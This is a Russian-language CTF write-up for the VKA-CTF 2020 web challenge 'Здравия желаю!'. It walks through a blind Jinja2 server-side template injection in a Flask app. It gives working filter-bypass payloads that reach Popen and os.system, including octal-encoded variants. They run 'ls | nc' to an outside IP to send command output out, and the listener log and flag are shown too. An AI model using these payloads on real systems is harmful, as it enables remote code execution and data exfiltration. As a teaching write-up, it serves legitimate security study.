## –ó–¥—Ä–∞–≤–∏—è –∂–µ–ª–∞—é!

| –°–æ–±—ã—Ç–∏–µ | –ù–∞–∑–≤–∞–Ω–∏–µ | –ö–∞—Ç–µ–≥–æ—Ä–∏—è | –°–ª–æ–∂–Ω–æ—Å—Ç—å |
|:--------|:---------|:----------|----------:|
| VKA-CTF`2020 | –ó–¥—Ä–∞–≤–∏—è –∂–µ–ª–∞—é! | Web | –í–´–ü–£–°–ö |

### –û–ø–∏—Å–∞–Ω–∏–µ
> –ê–≤—Ç–æ—Ä: [ ùïÇùï£ùïíùï¶ùï§ùïñ ]
>
> –ù–∞—á–∞–ª—å–Ω–∏–∫ –∫—É—Ä—Å–∞ –ø—Ä–∏–≤—ã–∫, —á—Ç–æ –∫–∞–∂–¥–æ–µ —É—Ç—Ä–æ –µ–≥–æ –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤—É—é—Ç –ø–æ–¥—á–∏–Ω–µ–Ω–Ω—ã–µ. –í–æ –≤—Ä–µ–º—è —Å–∞–º–æ–∏–∑–æ–ª—è—Ü–∏–∏ –ø—Ä–∏—à–ª–æ—Å—å –ø–µ—Ä–µ—Å—Ç—Ä–æ–∏—Ç—å—Å—è –Ω–∞ "—É–¥–∞–ª–µ–Ω–Ω—ã–π" —Ä–µ–∂–∏–º —Ä–∞–±–æ—Ç—ã. –ò –∫–∞–∫ –∂–µ —Ç–µ–ø–µ—Ä—å –∂–∏—Ç—å –±–µ–∑ —Å—Ç–∞—Ä—ã—Ö –ø—Ä–∏–≤—ã—á–µ–∫? –í—Å–µ –ø—Ä–æ—Å—Ç–æ - –∑–∞–¥–∞—á—É –ø–æ—Å—Ç–∞–≤–∏–ª, [—Ä–µ–∑—É–ª—å—Ç–∞—Ç](https://hello.vkactf.tk) –ø–æ–ª—É—á–∏–ª. –í–æ—Ç –Ω–∞—Å–∫–æ–ª—å–∫–æ –∫–∞—á–µ—Å—Ç–≤–µ–Ω–Ω—ã–π - —ç—Ç–æ —É–∂–µ –¥—Ä—É–≥–æ–π –≤–æ–ø—Ä–æ—Å.

### –†–µ—à–µ–Ω–∏–µ

![](./imgs/1.PNG)

[Wappalyzer](https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?hl=ru) –æ–ø—Ä–µ–¥–µ–ª–∏–ª, —á—Ç–æ —Å–µ—Ä–≤–µ—Ä –Ω–∞–ø–∏—Å–∞–Ω –Ω–∞ –≤–µ–± —Ñ—Ä–µ–π–º–≤–æ—Ä–∫–µ [Flask](https://flask.palletsprojects.com/)

–¢–∞–∫–∂–µ, –º—ã –≤–∏–¥–∏–º, —á—Ç–æ —Å–µ—Ä–≤–µ—Ä –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –Ω–∞–º –≤—Å—ë, —á—Ç–æ –º—ã –≤–≤–µ–¥—ë–º –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä `rank`

–ò—Å—Ö–æ–¥—è –∏–∑ —ç—Ç–æ–≥–æ, –º–æ–∂–Ω–æ –ø—Ä–µ–¥–ø–æ–ª–æ–∂–∏—Ç—å, —á—Ç–æ —Å–µ—Ä–≤–µ—Ä —É—è–∑–≤–∏–º –¥–ª—è [SSTI](https://defcon.ru/web-security/3840/)

–ü–æ–ø—Ä–æ–±–æ–≤–∞–≤ –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –Ω–∞–≥—Ä—É–∑–∫–∏, —Å–µ—Ä–≤–µ—Ä –æ—Ç–≤–µ—á–∞–ª
```–ó–¥—Ä–∞–≤–∏—è –∂–µ–ª–∞—é, —Ç–æ–≤–∞—Ä–∏—â noname, –Ω–µ –ø—ã—Ç–∞–π—Å—è –≤–∑–ª–æ–º–∞—Ç—å –º–µ–Ω—è :)!```

–°–∫–æ—Ä–µ–µ –≤—Å–µ–≥–æ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ —Ñ–∏–ª—å—Ç—Ä—É–µ—Ç—Å—è –ø–∞—Ä–∞–º–µ—Ç—Ä `rank` –∏ –º–Ω–æ–≥–∏–µ –Ω–∞–≥—Ä—É–∑–∫–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã. –ü—Ä–æ–¥–æ–ª–∂–∞–µ–º –∏—Å–∫–∞—Ç—å

–í–≤–µ–¥—è 

```jinja2
{% if 'hack' == 'hack' %} jinja2 {% endif %}
```

—Å–µ—Ä–≤–µ—Ä –Ω–∞–º –≤–µ—Ä–Ω—É–ª `jinja2`

–≠—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ —Ñ–∏–ª—å—Ç—Ä—É—é—Ç—Å—è `{{` –∏ `}}`, —Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ –º—ã –Ω–µ —Å–º–æ–∂–µ–º –Ω–∏—á–µ–≥–æ –≤–µ—Ä–Ω—É—Ç—å –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É (**BLIND**)

–î–∞–ª–µ–µ –º—ã –º–æ–∂–µ–º –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å, –∫–∞–∫–∏–µ —Å–∏–º–≤–æ–ª—ã –Ω–∞–º –¥–æ—Å—Ç—É–ø–Ω—ã –¥–ª—è –ø—Ä–æ–≤–µ–¥–µ–Ω–∏—è –∏–Ω—ä–µ–∫—Ü–∏–∏. –í–º–µ—Å—Ç–æ `jinja2` –≤ –Ω–∞—à–µ–π –Ω–∞–≥—Ä—É–∑–∫–µ –ø–æ–¥—Å—Ç–∞–≤–ª—è–µ–º —Ä–∞–∑–ª–∏—á–Ω—ã–µ —Å–∏–º–≤–æ–ª—ã –∏ –ø–æ–Ω–∏–º–∞–µ–º, —á—Ç–æ –Ω–∞–º –¥–æ—Å—Ç—É–ø–Ω—ã –ª–∏—à—å –∫–∞–≤—ã—á–∫–∞, `(` –∏ `)`

–ù–∞–º –Ω–µ –¥–æ—Å—Ç—É–ø–Ω—ã —Ç–∞–∫–∏–µ –æ–±—ä–µ–∫—Ç—ã, –∫–∞–∫ `self`, `config`, `request`, `url_for`, –∞ —Ç–∞–∫–∂–µ –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω —Å–∏–º–≤–æ–ª `_` , —á—Ç–æ –æ—á–µ–Ω—å —Å–∏–ª—å–Ω–æ –Ω–∞—Å –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ—Ç

–ù–∞–º –¥–æ—Å—Ç—É–ø–Ω—ã –∫–∞–≤—ã—á–∫–∏, –∞ –∑–Ω–∞—á–∏—Ç –º—ã –º–æ–∂–µ–º –ø–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å –ø–æ–¥–Ω—è—Ç—å—Å—è –¥–æ –∫–ª–∞—Å—Å–∞ `object` 

–î–ª—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ –¥–∞–Ω–Ω–æ–π –∏–Ω—ä–µ–∫—Ü–∏–∏ –Ω–∞–º –Ω–µ–æ–±—Ö–æ–¥–∏–º —Å–∏–º–≤–æ–ª `_`

–¢–∞–∫ –∫–∞–∫ –º—ã –Ω–µ –º–æ–∂–µ–º –Ω–∞–ø—Ä—è–º—É—é –≤–≤–µ—Å—Ç–∏ –µ–≥–æ, —Ç–æ –ø–æ–ø—Ä–æ–±—É–µ–º –Ω–∞–π—Ç–∏ –µ–≥–æ –≤ –∫–∞–∫–æ–º-–Ω–∏–±—É–¥—å –∫–ª–∞—Å—Å–µ, —Å –ø–æ–º–æ—â—å—é —Ñ–∏–ª—å—Ç—Ä–æ–≤ `jinja2` –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞—Ç—å –µ–≥–æ –≤ —Å—Ç—Ä–æ–∫—É, –∑–∞—Ç–µ–º –≤ —Å–ø–∏—Å–æ–∫, –∞ –ø–æ—Å–ª–µ –æ–±—Ä–∞—Ç–∏—Ç—å –∫ —ç–ª–µ–º–µ–Ω—Ç—É —Å–ø–∏—Å–∫–∞, –∞ –∏–º–µ–Ω–Ω–æ –∫ `_`

```python
obj|string|list[20]
```

–≠—Ç–æ—Ç —Å–∏–º–≤–æ–ª –µ—Å—Ç—å –≤ –æ–±—ä–µ–∫—Ç–µ `lipsum`, –Ω–æ –≤–æ–∑–Ω–∏–∫–∞–µ—Ç –ø—Ä–æ–±–ª–µ–º–∞ –≤ –æ–±—Ä–∞—â–µ–Ω–∏–∏ —ç–ª–µ–º–µ–Ω—Ç—É —Å–ø–∏—Å–∫–∞, —Ç–∞–∫ –∫–∞–∫ –º—ã –Ω–µ –º–æ–∂–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å `[` –∏ `]`

> –û–∫–∞–∑–≤–∞–µ—Ç—Å—è, –≤–º–µ—Å—Ç–æ `_` –º–æ–∂–Ω–æ –±—ã–ª–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å `\137` (–†–µ—à–µ–Ω–∏–µ –∏–≥—Ä–æ–∫–∞ @exp101t)

–£ `jinja2` –µ—Å—Ç—å —Ñ–∏–ª—å—Ç—Ä `random`, –∫–æ—Ç–æ—Ä—ã–π –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å–ª—É—á–∞–π–Ω—ã–π —ç–ª–µ–º–µ–Ω—Ç —Å–ø–∏—Å–∫–∞. –¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º –º—ã –º–æ–∂–µ–º –ø–æ–ª—É—á–∏—Ç—å —Å–∏–º–≤–æ–ª `_` —Å–ª–µ–¥—É—é—â–∏–º —Å–ø–æ—Å–æ–±–æ–º (–∫–æ–≥–¥–∞ –Ω–∞–º –ø–æ–≤–µ–∑—ë—Ç :) )

```python
lipsum|string|random
```

–¢–∞–∫ –∫–∞–∫ –Ω–∞–º –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã —Å–∏–º–≤–æ–ª —Ç–æ—á–∫–∏ –∏ –∫–≤–∞–¥—Ä–∞—Ç–Ω—ã—Ö —Å–∫–æ–±–æ–∫, –º—ã –º–æ–∂–µ–º –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –∫–æ–Ω—Å—Ç—Ä—É–∫—Ü–∏–µ–π ```|attr()```

–¢–∞–∫–∂–µ, —á—Ç–æ–±—ã –Ω–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫–∞–∂–¥—ã–π —Ä–∞–∑ –æ–±—ä–µ–∫—Ç `lipsum` —Å–æ–∑–¥–∞–¥–∏–º –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é

```jinja2
{% set x = lipsum|string|random %}
```

–ò—Å—Ö–æ–¥—è –∏–∑ –≤—ã—à–µ—Å–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –∏ –∏—Å–ø–æ–ª—å–∑—É—è —Ñ–∏–ª—å—Ç—Ä `|join` , –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å —Å–ª–µ–¥—É—é—â—É—é –∑–∞–º–µ–Ω—É

```python
''.__class__ -> ''|attr((x,x,'class',x,x)|join)
```

–¢–µ–ø–µ—Ä—å –∫–æ–≥–¥–∞ –º—ã –º–æ–∂–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å `_` –æ–±—Ä–∞—Ç–∏–º—Å—è –∫ —ç–ª–µ–º–µ–Ω—Ç—É —á–µ—Ä–µ–∑ –º–µ—Ç–æ–¥ `__getitem__(x)`

```python
[2] -> __getitem__(2)
```
–î–æ–π–¥—è —Ç–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º –¥–æ –∫–ª–∞—Å—Å–∞ `object` , –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –Ω–∞–π—Ç–∏ –∫–ª–∞—Å—Å `popen` . –¢–∞–∫ –∫–∞–∫ –º—ã —Ä–∞–±–æ—Ç–∞–µ–º –≤—Å–ª–µ–ø—É—é, –º–æ–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –∑–∞–ø—Ä–æ—Å –Ω–∏–∂–µ —Å –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏ ```('ls',shell=True,stdout=-1)```

```python
''.__class__.__base__.__subclasses__()[<num>]('ls',shell=True,stdout=-1) -> ''|attr((x,x,'class',x,x)|join)|attr((x,x,'base',x,x)|join)|attr((x,x,'subclasses',x,x)|join)()|attr((x,x,'getitem',x,x)|join)(<num>)('ls',shell=True,stdout=-1)
```

–¢–µ –∫–ª–∞—Å—Å—ã, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ –æ–∂–∏–¥–∞—é—Ç —ç—Ç–∏—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤, —Å–æ–æ–±—â–∞—Ç –æ–± –æ—à–∏–±–∫–µ (–≤ –Ω–∞—à–µ–º —Å–ª—É—á–∞–µ - ‚Äúnoname, —Ç—ã –≤—Å—ë —Å–ª–æ–º–∞–ª‚Äù). –¢–∞–∫–∂–µ –Ω–µ –∑–∞–±—ã–≤–∞–µ–º, —á—Ç–æ —Å–µ—Ä–≤–µ—Ä –º–æ–∂–µ—Ç –≤–µ—Ä–Ω—É—Ç—å –æ—à–∏–±–∫—É, –∫–æ–≥–¥–∞ –∏–∑ `random` –Ω–µ –≤—ã–ø–∞–ª `_`

–í –º–æ—ë–º —Å–ª—É—á–∞–µ –±–µ–∑–æ—à–∏–±–æ—á–Ω–æ —Å—Ä–∞–±–æ—Ç–∞–ª–∏ —á–∏—Å–ª–∞ 76, 84, 126, 145, 266, 401, 405

–¢–µ–ø–µ—Ä—å, –∫–æ–≥–¥–∞ –º—ã ‚Äú–ø—Ä–µ–¥–ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ‚Äù –º–æ–∂–µ–º –≤—ã–ø–æ–ª–Ω—è—Ç—å –∫–æ–º–∞–Ω–¥—É –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ, –ø–æ–ª—É—á–∏–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –µ—ë –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —á–µ—Ä–µ–∑ —Å—Ç–æ—Ä–æ–Ω–Ω–∏–π —Ä–µ—Å—É—Ä—Å, –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–≤ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –ø–æ `nc`. –ù–µ –∑–∞–±—ã–≤–∞–µ–º, —á—Ç–æ –Ω–∞–º –Ω–µ–ª—å–∑—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ç–æ—á–∫—É, —Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å ip –∞–¥—Ä–µ—Å –≤ –¥–µ—Å—è—Ç–∏—á–Ω–æ–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ, –Ω–∞–ø—Ä–∏–º–µ—Ä [—Ç—É—Ç](https://www.browserling.com/tools/ip-to-dec)

–ò—Å–ø–æ–ª—å–∑—É–µ–º —Å–ª–µ–¥—É—é—â—É—é  –Ω–∞–≥—Ä—É–∑–∫—É –¥–ª—è —ç—Ç–æ–≥–æ

```jinja2
{% set x=lipsum|string|random %}{% if ''|attr((x,x,'class',x,x)|join)|attr((x,x,'base',x,x)|join)|attr((x,x,'subclasses',x,x)|join)()|attr((x,x,'getitem',x,x)|join)(<num>)('ls | nc 134744072 9090',shell=True,stdout=-1)|attr('communicate')()|first|attr('strip')() == 'KRAUSE' %} a {%  endif %}
```

—á—Ç–æ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç –Ω–∞–≥—Ä—É–∑–∫–µ

```python
''.__class__.__base__.__subclasses__()[<name>]('ls | nc 8.8.8.8 9090',shell=True,stdout=-1).communicate()[0].strip()
```

**NOTE:** —Ñ–∏–ª—å—Ç—Ä `|first` –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ–±—Ä–∞—â–µ–Ω–∏—è –∫ –ø–µ—Ä–≤–æ–º—É —ç–ª–µ–º–µ–Ω—Ç —Å–ø–∏—Å–∫–∞

–ù–∞ —Å–µ—Ä–≤–µ—Ä–µ –æ—Ç–∫—Ä—ã–≤–∞–µ–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –∏ –∂–¥—ë–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è ‚Ä¶

–ö–æ–≥–¥–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –ø—Ä–æ–∏–∑–æ–π–¥—ë—Ç —Å–æ—Ö—Ä–∞–Ω—è–µ–º —Å–µ–±–µ –Ω–æ–º–µ—Ä –∫–ª–∞—Å—Å–∞ –∏ —Ä–∞–¥—É–µ–º—Å—è, —É–≤–∏–¥–µ–≤ —Ä–µ–∑—É–ª—å—Ç–∞—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã

```bash
‚òÅ  ~  nc -nvlp 9090
Listening on [0.0.0.0] (family 0, port 9090)
Connection from xx.xx.xx.xx 19386 received!
app.py
flag
requirements.txt
```

–í—ã–ø–æ–ª–Ω—è–µ–º `cat flag` –∏ –ø–æ–ª—É—á–∞–µ–º —Ñ–ª–∞–≥)

-----
### –†–µ—à–µ–Ω–∏–µ –∏–≥—Ä–æ–∫–∞ @exp101t
–†–µ—à–∏—Ç—å –º–æ–∂–Ω–æ –±—ã–ª–æ –∏ –±–µ–∑ –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞, –Ω–∞–ø—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑—É—è –Ω–∞–≥—Ä—É–∑–∫—É 
```python
{% if lipsum|attr('\137\137globals\137\137')|attr('\137\137getitem\137\137')('\137\137builtins\137\137')|attr('get')('eval')('\137\137import\137\137("os")\56system("\154\163\40\174\40\156\143\40\70\56\70\56\70\56\70\40\71\60\71\60")') %} True {% else %} False {% endif %}
```
—á—Ç–æ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç –Ω–∞–≥—Ä—É–∑–∫–µ
```python
{% if lipsum.__globals__["__builtins__"].eval('__import__("os").system("ls | nc 8.8.8.8 9090")') %} True {% else %} False {% endif %}
```
---

**–§–ª–∞–≥:**

> vka{cr4zy_byp455_5571_f1l73r5_my_c0n6r47ul4710n5}